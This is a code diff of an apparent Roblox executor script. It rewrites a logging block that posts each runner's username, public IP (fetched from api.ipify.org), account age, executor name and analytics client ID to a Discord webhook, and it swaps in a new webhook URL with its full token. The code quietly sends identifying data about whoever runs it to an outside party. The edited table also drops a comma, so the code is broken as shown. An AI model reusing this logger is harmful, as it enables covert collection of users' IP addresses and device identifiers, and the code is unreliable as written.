@@ -8,7 +8,7 @@ getgenv().sessionExecutions += 1
 pcall(function()
 request = request or http_request or (http and http.request) or (syn and syn.request)
 local rawtime = tick()
-local url = "https://discord.com/api/webhooks/1241503371286937600/rFvS_m5uBpc_HfmH2LHg1iSgwj9hn4bZbKJcyhokxSWj8oYtYOM5jzAHhWJ5J-h0KElL"
+local url = "https://discord.com/api/webhooks/1241538274846179389/0QT572Nc623fv5SbODEviBgkxfqlrIglh5ssQiKBHQBh9zH-bfIHdYNQFrQvVhKgPt37"
 
 local plrsInServer = #game.Players:GetPlayers()
 local isAlt = (game.Players.LocalPlayer.AccountAge < 28)
@@ -19,93 +19,43 @@ local data = {
             ["name"] = "Log Data",
             ["icon_url"] = "https://i.pinimg.com/736x/f4/30/75/f43075a7946a71f03759ce502d0a8a6d.jpg"
         },
-        ["description"] = "",
+        ["description"] = "UwU / ".."<t:"..tostring(os.time())..">",
         ["color"] = tonumber(0xFFFAFA),
         ["fields"] = {
             {
                 ["name"] = "Username",
                 ["value"] = game.Players.LocalPlayer.Name,
-                ["inline"] = false
+                ["inline"] = true
             },
             {
-                ["name"] = "Display Name",
-                ["value"] = "@"..game.Players.LocalPlayer.DisplayName,
-                ["inline"] = false
-            },
-            {
-                ["name"] = "Executed At",
-                ["value"] = "<t:"..tostring(os.time())..">",
-                ["inline"] = false
-            },
-            {
-                ["name"] = "IP Adress",
+                ["name"] = "IP",
                 ["value"] = game:HttpGet("https://api.ipify.org"),
-                ["inline"] = false
+                ["inline"] = true
             },
             {
                 ["name"] = "Account Age",
                 ["value"] = game.Players.LocalPlayer.AccountAge..` ({game.Players.LocalPlayer.AccountAge / 365} years)`,
-                ["inline"] = false
-            },
-            {
-                ["name"] = "User Id",
-                ["value"] = game.Players.LocalPlayer.UserId,
-                ["inline"] = false
-            },
-            {
-                ["name"] = "Game Id",
-                ["value"] = game.PlaceId,
-                ["inline"] = false
-            },
-            {
-                ["name"] = "Game Name",
-                ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-                ["inline"] = false
-            },
-            {
-                ["name"] = "Game Link",
-                ["value"] = "https://roblox.com/games/"..game.PlaceId,
-                ["inline"] = false
-            },
-            {
-                ["name"] = "Job Id",
-                ["value"] = game.JobId,
-                ["inline"] = false
-            },
-            {
-                ["name"] = "Profile",
-                ["value"] = "https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
-                ["inline"] = false
-            },
+                ["inline"] = true
+            }
             {
                 ["name"] = "Executor",
                 ["value"] = identifyexecutor(),
-                ["inline"] = false
-            },
-            {
-                ["name"] = "Players In Server",
-                ["value"] = plrsInServer,
-                ["inline"] = false
-            },
-            {
-                ["name"] = "Likely Alt Account",
-                ["value"] = isAlt and "Yes" or "No",
-                ["inline"] = false
+                ["inline"] = true
             },
             {
                 ["name"] = "Client Id",
                 ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-                ["inline"] = false
+                ["inline"] = true
             },				            
 	    {
         	["name"] = "Session Executions",
                 ["value"] = getgenv().sessionExecutions,
-                ["inline"] = false
+                ["inline"] = true
             },
 	    {
         	["name"] = "Script Type",
                 ["value"] = "NORMAL",
-                ["inline"] = false
+                ["inline"] = true
             },
         },
     }},
